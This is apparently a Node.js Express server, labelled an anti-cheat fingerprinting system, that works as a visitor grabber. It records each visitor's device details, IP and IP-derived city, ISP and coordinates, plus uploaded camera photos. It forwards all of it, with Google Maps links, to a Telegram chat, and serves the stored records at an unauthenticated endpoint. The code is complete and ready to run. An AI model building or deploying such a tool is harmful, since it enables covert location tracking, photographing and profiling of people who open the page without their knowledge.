require('dotenv').config();

const express = require('express');
const http = require('http');
const https = require('https');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

let bot = null;
if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
  try {
    const TelegramBot = require('node-telegram-bot-api');
    const BotClass = TelegramBot.default || TelegramBot;
    bot = new BotClass(TELEGRAM_TOKEN, { polling: true });
    console.log('Telegram bot connected successfully!');
  } catch (e) {
    console.log('Telegram bot error:', e.message);
  }
} else {
  console.log('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
}

const DATA_DIR = path.join(__dirname, 'data');
const UPLOADS_DIR = path.join(DATA_DIR, 'uploads');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');

fs.mkdirSync(UPLOADS_DIR, { recursive: true });
console.log('Data dir:', DATA_DIR);
console.log('Uploads dir:', UPLOADS_DIR);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(UPLOADS_DIR));

function readDevices() {
  try { return JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf-8')); }
  catch { return []; }
}

function saveDevice(data) {
  const devices = readDevices();
  devices.push(data);
  fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
}

function getIP(req) {
  return req.headers['cf-connecting-ip'] ||
         req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['x-real-ip'] ||
         req.connection?.remoteAddress?.replace('::ffff:', '') ||
         req.socket?.remoteAddress?.replace('::ffff:', '') ||
         'unknown';
}

function parseUAModel(ua) {
  ua = ua || '';
  if (/Android/i.test(ua)) {
    const modelPatterns = [
      [/SM-([A-Za-z0-9]+)/, 'Samsung SM-'],
      [/SAMSUNG[ -]([A-Za-z0-9]+)/, 'Samsung '],
      [/Pixel[ _]?(\d+[a-z]*)/i, 'Google Pixel '],
      [/ONEPLUS[ _]?([A-Za-z0-9]+)/i, 'OnePlus '],
      [/Xiaomi[ _]?(\d+[A-Za-z]*)/, 'Xiaomi '],
      [/Redmi[ _]?([A-Za-z0-9]+)/i, 'Xiaomi Redmi '],
      [/POCO[ _]?([A-Za-z0-9]+)/i, 'Xiaomi POCO '],
      [/HUAWEI[ _]?([A-Za-z0-9-]+)/i, 'Huawei '],
      [/HONOR[ _]?([A-Za-z0-9-]+)/i, 'Honor '],
      [/OPPO[ _]?([A-Za-z0-9]+)/i, 'OPPO '],
      [/vivo[ _]?([A-Za-z0-9]+)/i, 'vivo '],
      [/realme[ _]?([A-Za-z0-9]+)/i, 'realme '],
      [/LG-([A-Za-z0-9]+)/, 'LG '],
      [/Moto[ _]?[G|E|Z][ _]?([A-Za-z0-9]*)/i, 'Motorola '],
      [/Nokia[ _]?([A-Za-z0-9]+)/i, 'Nokia '],
      [/ASUS[ _]?([A-Za-z0-9_-]+)/i, 'ASUS '],
      [/Lenovo[ _]?([A-Za-z0-9_-]+)/i, 'Lenovo '],
      [/INFINIX[ _]?([A-Za-z0-9]+)/i, 'Infinix '],
      [/TECNO[ _]?([A-Za-z0-9]+)/i, 'TECNO '],
    ];
    for (const [p, b] of modelPatterns) {
      const m = ua.match(p); if (m) return b + (m[1] || '');
    }
    const av = ua.match(/Android\s+([\d.]+)/);
    return 'Android' + (av ? ' ' + av[1] : ' Device');
  }
  if (/iPhone/.test(ua)) { const v = ua.match(/OS\s+(\d+[._]\d+)/); return 'iPhone' + (v ? ' iOS ' + v[1].replace(/_/g, '.') : ''); }
  if (/iPad/.test(ua)) { const v = ua.match(/OS\s+(\d+[._]\d+)/); return 'iPad' + (v ? ' iOS ' + v[1].replace(/_/g, '.') : ''); }
  if (/iPod/.test(ua)) return 'iPod';
  if (/Windows/.test(ua)) { const wv = ua.match(/Windows NT\s+([\d.]+)/); return 'Windows ' + (wv ? wv[1] : '') + (ua.includes('x64') || ua.includes('Win64') ? ' x64' : ' x86'); }
  if (/Mac OS|Macintosh/.test(ua) && !/iPhone|iPad|iPod/.test(ua)) { const mv = ua.match(/Mac OS X\s+([\d_]+)/); return 'macOS ' + (mv ? mv[1].replace(/_/g, '.') : ''); }
  if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux';
  return ua.substring(0, 80);
}

function getDeviceInfo(req) {
  const ua = req.headers['user-agent'] || '';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
  const isAndroid = /Android/i.test(ua);
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  let browser = 'Other';
  if (ua.includes('Edg')) browser = 'Edge';
  else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
  else if (ua.includes('SamsungBrowser')) browser = 'Samsung';
  let os = 'Other';
  if (isAndroid) os = 'Android';
  else if (isIOS) os = 'iOS';
  else if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac OS') || ua.includes('Macintosh')) os = 'macOS';
  else if (ua.includes('Linux') && !isAndroid) os = 'Linux';
  let deviceType = isMobile ? 'Mobile' : 'Desktop';
  if (ua.includes('Tablet') || (ua.includes('iPad'))) deviceType = 'Tablet';
  const serverModel = parseUAModel(ua);
  return { isMobile, isAndroid, isIOS, browser, os, deviceType, ua, serverModel };
}

function httpGet(url) {
  return new Promise((resolve) => {
    const lib = url.startsWith('https') ? https : http;
    lib.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(null); }
      });
    }).on('error', () => resolve(null));
  });
}

async function getIPLocation(ip) {
  if (!ip || ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' ||
      ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) return null;

  try {
    const data = await httpGet(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,query`);
    if (data && data.status === 'success') {
      return {
        city: data.city,
        region: data.regionName,
        country: data.country,
        countryCode: data.countryCode,
        isp: data.isp || data.org,
        lat: data.lat,
        lon: data.lon,
        zip: data.zip
      };
    }
  } catch (e) {}

  try {
    const data = await httpGet(`https://ipapi.co/${ip}/json/`);
    if (data && !data.error) {
      return {
        city: data.city,
        region: data.region,
        country: data.country_name,
        countryCode: data.country_code,
        isp: data.org,
        lat: data.latitude,
        lon: data.longitude,
        zip: data.postal
      };
    }
  } catch (e) {}

  return null;
}

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '';
  return countryCode.toUpperCase().replace(/./g, c =>
    String.fromCodePoint(0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

function sendTelegramMessage(text) {
  if (!bot) return;
  bot.sendMessage(TELEGRAM_CHAT_ID, text, { parse_mode: 'Markdown', disable_web_page_preview: false })
    .catch(e => console.log('Message send error:', e.message));
}

function savePhotoToDisk(filename, buffer) {
  const filePath = path.join(UPLOADS_DIR, filename);
  fs.writeFileSync(filePath, buffer);
  return filePath;
}

function formatNetwork(connectionType) {
  if (!connectionType || connectionType === 'unknown') return 'Unknown';
  if (connectionType.includes('|')) {
    const [raw, eff] = connectionType.split('|');
    const map = { wifi: 'WiFi', cellular: 'Mobile Data', ethernet: 'Ethernet', bluetooth: 'Bluetooth', wimax: 'WiMAX' };
    const typeName = map[raw] || raw || 'Unknown';
    const speed = eff === '4g' ? '4G' : eff === '3g' ? '3G' : eff === '2g' ? '2G' : eff === 'slow-2g' ? '2G (Slow)' : eff;
    return typeName + ' (' + speed + ')';
  }
  return connectionType;
}

app.post('/api/capture', async (req, res) => {
  const {
    deviceModel: clientDeviceModel,
    screen, availScreen, windowSize, language, languages, platform,
    cores, memory, timezone, connectionType,
    battery, batteryCharging, colorDepth, pixelRatio, touchPoints,
    orientation, vendor, appVersion, realIP: clientRealIP,
    browser: clientBrowser, os: clientOS, deviceType: clientDeviceType, deviceHash
  } = req.body;

  let ip = getIP(req);
  if ((!ip || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.'))
      && clientRealIP && clientRealIP.length > 3) {
    ip = clientRealIP;
  }

  const device = getDeviceInfo(req);
  const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Baghdad' });
  const id = Date.now().toString();

  const finalModel = (clientDeviceModel && clientDeviceModel.length > 3) ? clientDeviceModel : device.serverModel;
  const finalBrowser = clientBrowser || device.browser;
  const finalOS = clientOS || device.os;
  const finalDeviceType = clientDeviceType || device.deviceType;

  const ipLoc = await getIPLocation(ip);
  const networkStr = formatNetwork(connectionType);
  const battStr = battery ? battery + '%' + (batteryCharging === true || batteryCharging === 'true' ? ' Charging' : '') : 'N/A';
  const coresStr = cores ? (cores > 0 ? cores + ' cores' : 'N/A') : 'N/A';
  const memoryStr = memory ? (memory > 0 ? memory + ' GB' : 'N/A') : 'N/A';
  const colorStr = colorDepth ? colorDepth + 'bit' : 'N/A';
  const orientationStr = orientation && orientation !== 'unknown' ? orientation : 'N/A';

  console.log('');
  console.log('========================================');
  console.log('  Device Checked');
  console.log(`  Model: ${finalModel || 'N/A'}`);
  console.log(`  IP: ${ip}`);
  console.log(`  Hash: ${deviceHash || 'N/A'}`);
  console.log(`  Type: ${finalDeviceType} | OS: ${finalOS} | Browser: ${finalBrowser}`);
  console.log(`  Network: ${networkStr} | Battery: ${battStr}`);
  console.log(`  Screen: ${screen} | ${colorStr} | @${pixelRatio}x`);
  console.log(`  CPU: ${coresStr} | RAM: ${memoryStr}`);
  if (ipLoc) console.log(`  Location: ${ipLoc.city}, ${ipLoc.country} | ISP: ${ipLoc.isp}`);
  console.log(`  Time: ${now}`);
  console.log('========================================');

  let deviceEmoji = '📱';
  if (finalOS === 'iOS') deviceEmoji = '🍎';
  else if (finalOS === 'Android') deviceEmoji = '🤖';
  else if (finalOS === 'Windows' || finalOS === 'macOS' || finalOS === 'Linux') deviceEmoji = '💻';

  const flag = ipLoc ? getCountryFlag(ipLoc.countryCode) : '';
  const ipMapLink = (ipLoc && ipLoc.lat) ? `https://maps.google.com/?q=${ipLoc.lat},${ipLoc.lon}` : null;

  const lines = [
    '🖥 *Device Checked*',
    '━━━━━━━━━━━━━━━━━━━━━━━━',
    '',
    `${deviceEmoji} *DEVICE INFO*`,
    `📱 Model: \`${finalModel || 'N/A'}\``,
    `💻 OS: ${finalOS} | Browser: ${finalBrowser}`,
    `🖥 Screen: ${screen || 'N/A'} ${colorDepth ? colorDepth+'bit' : ''} ${pixelRatio ? '@'+pixelRatio+'x' : ''}`,
    `🧠 CPU: ${cores || 'N/A'} cores | RAM: ${memory || 'N/A'} GB`,
    `🔋 Battery: ${battStr}`,
    `📶 Network: ${networkStr}`,
    `🌍 Language: ${language || 'N/A'}`,
    `🕐 Timezone: ${timezone || 'N/A'}`,
    `🔑 Hash: \`${deviceHash || 'N/A'}\``,
    '',
    '━━━━━━━━━━━━━━━━━━━━━━━━',
    '🌐 *NETWORK*',
    `🔌 IP Address: \`${ip}\``,
  ];

  if (ipLoc) {
    lines.push(`${flag} Country: ${ipLoc.country || 'Unknown'}`);
    lines.push(`🏙 City: ${[ipLoc.city, ipLoc.region, ipLoc.zip].filter(Boolean).join(', ')}`);
    lines.push(`📡 ISP: ${ipLoc.isp || 'Unknown'}`);
    if (ipMapLink) {
      lines.push('');
      lines.push(`[🗺 Open Google Maps — ${ipLoc.city || 'Location'}](${ipMapLink})`);
    }
  }

  lines.push('');
  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push(`🕐 *Time:* ${now}`);

  sendTelegramMessage(lines.join('\n'));

  saveDevice({
    id, deviceHash: deviceHash || null, ip,
    deviceModel: finalModel,
    ipCity: ipLoc?.city || null, ipRegion: ipLoc?.region || null, ipCountry: ipLoc?.country || null, ipISP: ipLoc?.isp || null,
    ipLat: ipLoc?.lat || null, ipLon: ipLoc?.lon || null,
    deviceType: finalDeviceType, os: finalOS, browser: finalBrowser,
    connectionType: networkStr,
    battery: battery || null, batteryCharging: batteryCharging || null,
    screen, availScreen, windowSize, colorDepth: colorDepth || null, pixelRatio: pixelRatio || null,
    touchPoints: touchPoints || null, orientation: orientationStr, vendor: vendor || null,
    language, languages, platform, cores: cores || 0, memory: memory || 0, timezone,
    ua: device.ua, appVersion: appVersion || null, timestamp: now, timeISO: new Date().toISOString()
  });

  res.json({ success: true });
});

app.post('/api/photo', upload.single('photo'), (req, res) => {
  if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
    console.log('Photo upload: No file received');
    return res.json({ success: false, error: 'No file' });
  }

  try {
    const filename = 'photo_' + Date.now() + '.jpg';
    const filePath = savePhotoToDisk(filename, req.file.buffer);
    const ip = getIP(req);

    console.log('Photo saved to disk:', filePath, 'Size:', req.file.buffer.length);

    const devices = readDevices();
    for (let i = devices.length - 1; i >= 0; i--) {
      if (!devices[i].photo) {
        devices[i].photo = '/uploads/' + filename;
        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
        break;
      }
    }

    if (bot) {
      const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Baghdad' });
      bot.sendPhoto(TELEGRAM_CHAT_ID, filePath, {
        caption: `📸 *Camera Test Photo*\n\n🌐 IP: \`${ip}\`\n🕐 ${now}`,
        parse_mode: 'Markdown'
      }).then(() => {
        console.log('Photo sent to Telegram OK');
      }).catch(e => {
        console.log('Telegram photo send error:', e.message);
      });
    }

    res.json({ success: true, photo: '/uploads/' + filename });
  } catch (e) {
    console.log('Photo save error:', e.message);
    res.json({ success: false, error: e.message });
  }
});

app.get('/api/devices', (req, res) => {
  res.json(readDevices().reverse());
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('');
  console.log('Anti-Cheat Device Fingerprinting System');
  console.log('Web:   http://localhost:' + PORT);
  console.log('Admin: http://localhost:' + PORT + '/admin');
  console.log('');
  if (bot) {
    sendTelegramMessage('🟢 *Anti-Cheat System Online!*\n\nDevice fingerprinting ready.');
  }
});
